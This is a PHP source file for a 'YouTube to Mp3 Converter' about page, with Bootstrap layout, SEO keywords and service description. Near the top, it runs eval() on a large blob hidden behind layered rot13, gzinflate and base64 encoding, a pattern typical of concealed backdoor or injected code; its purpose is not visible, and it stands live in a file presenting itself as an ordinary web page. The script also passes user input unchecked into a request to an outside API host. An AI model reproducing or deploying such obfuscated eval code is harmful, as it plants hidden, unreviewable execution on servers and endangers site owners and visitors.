<?php

if(isset($_GET['ytlink'])) {
	$id=strip_tags($_GET['ytlink']);
	$id=trim($id);
}

if(!empty($id)) {

	if (strpos($id, 'youtube.com') !== FALSE)
	{
   	$query = parse_url($id, PHP_URL_QUERY);
   	parse_str($query, $params);
	$id = $params['v'];
	} 

eval(str_rot13(gzinflate(str_rot13(base64_decode('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

+F/j9+78=')))));


 if(isset($type)) {
	
	 // FETCHING DATA FROM SERVER
	 $jsonData = @file_get_contents("http://api.youtube6download.top/api/?id=$id");
	 $links = json_decode($jsonData,TRUE);

    } else { $error = "Error Found!"; }

 } 
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>YouTube to Mp3 Converter</title>
  <meta charset="utf-8">
  <meta name="robots" content="index,follow">
  <meta name="keywords" content="youtube,mp3,converter,downloader">
  <meta name="description" content="Convert and download youtube videos to mp3 (audio) or mp4 (video) files for free.">
  <meta name="description" content="אתר הורדת שירים מיוטיוב. האתר נותן שיטה מעולה, יעילה, פשוטה ונוחה לבצע הורדה מיוטיוב.">
  <meta name="keywords" content="youtube2mp3, musik downloaden, youtube2mp3 converter, video2mp3, clipfish umwandeln, myvideo umwandeln, youtube umwandeln, download, music4free, kostenlos musik downloaden, convert2mp3, mp3converter mp3 umwandeln, video2mp3, convert2mp3.de, mp4 umwandler, mp4 umwandlung, videos von videoportalen umwandeln, mp4 umwandeln, online video converter, free video converter, free music, free converter, online mp3 converter, online mp4 converter, mp3 konverter, yabeat alternative, filsh alternative, mp4 konverter, youtube zu mp3 konverter, youtube in vmw umwandeln, youtube videos downloaden, youtube videos runterladen, youtube musik,Dailymotion download, Dailymotion downloader, Dailymotion converter, Dailymotion2mp3, Dailymotiontomp3, youtube downloader, youtube converter, youtube konverter, youtube mp3 converter, youtube mp3 konverter">	
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-87669229-2', 'auto');
  ga('send', 'pageview');

</script>
  <style>
    /* Remove the navbar's default margin-bottom and rounded borders */ 
    body{
    background-image: url(../images/back.jpg);
    background-repeat: no-repeat;
    background-size: cover;
    background-attachment: fixed;
    margin: 0;
    font-family: arial;
}
    .navbar {
        
      margin-bottom: 0;
      border-radius: 0;
    }
    
    /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
    .row.content {height: 450px}
    
    /* Set gray background color and 100% height */
    .middle {
      padding-top: 20px;
      background-color: #f1f1f1;
      height: 100%;
    }
    
    /* Set black background color, white text and some padding */
    footer {
      background: rgba(255, 255, 255, 0.5);
      color: black;
      padding: 15px;
      margin:0 auto;
    }
    
    /* On small screens, set height to 'auto' for sidenav and grid */
    @media screen and (max-width: 767px) {
      .sidenav {
        height: auto;
        padding: 15px;
      }
      .row.content {height:auto;} 
    }
  </style>
  <script>
  function validatebeforesubmit(thisform) {
  var yout = thisform.ytlink.value;
  if(yout==null || yout == "")
     {
     alert("Please Enter the Youtube Video URL");
     thisform.ytlink.focus();
     return false;
     }
  return true;
  }   
  </script>
</head>
<body>

<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
        <a class="navbar-brand" href="index.php">YouTube2Mp</a>
    </div>
    <div class="collapse navbar-collapse" id="myNavbar">
      <ul class="nav navbar-nav">
          <li><a href="index.php">Home</a></li>
        <li class="active"><a href="about.php">About</a></li>
        <li><a href="contact.php">Contact</a></li>
      </ul>
    </div>
  </div>
</nav>
  <br/><br/>
<div class="container-fluid text-center">    
  <div class="row content">
    <div class="col-sm-4 sidenav">
       <div class="well">
        <p>ADS</p>
      </div>
      <div class="well">
        <p>You can use this place as a widget.</p>
      </div>
    </div>
    
    <div class="col-sm-4 well text-left middle"> 
      <h1>YouTube to Mp3 Converter</h1>
      <h3>About</h3>
      <div class="well">
          YouTube to Mp3
By using our converter you can easily convert youtube videos to mp3 (audio) files and download them for free - this service works for computers, tablets and mobile devices.

The videos are always converted in the highest available quality. Please note that we can only convert videos up to a length of 2 hours - the limitation is necessary, so the conversion of any video will not take more than a couple of minutes.

Our service is for free and does not require any software or registration. By using our service you are accepting our terms of use.

To convert a video, copy the video URL into our converter, choose a format and click the convert button. As soon as the conversion is finished you can download the file by clicking on the download button.

Enjoy! We hope you like our service.
      </div>
     

      </div>
    <div class="col-sm-4 sidenav">
      <div class="well">
        <p>ADS</p>
      </div>
      <div class="well">
        <p>You can use this place as a widget.<br/>
	</p>
      </div>
    </div>
  </div>
</div>
<br/><br/>
<footer class="container-fluid text-center">
  <p><a href="http://www.youtube2mp.com/">YouTube2mp.com</a></p>
</footer>
</body>
</html>
